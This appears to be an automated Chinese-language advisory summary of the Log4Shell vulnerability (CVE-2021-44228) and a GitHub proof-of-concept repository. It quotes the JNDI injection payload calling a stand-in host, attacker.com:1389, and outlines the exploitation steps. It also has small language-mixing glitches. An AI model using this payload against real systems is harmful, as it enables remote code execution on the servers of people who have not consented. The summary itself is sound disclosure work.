## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)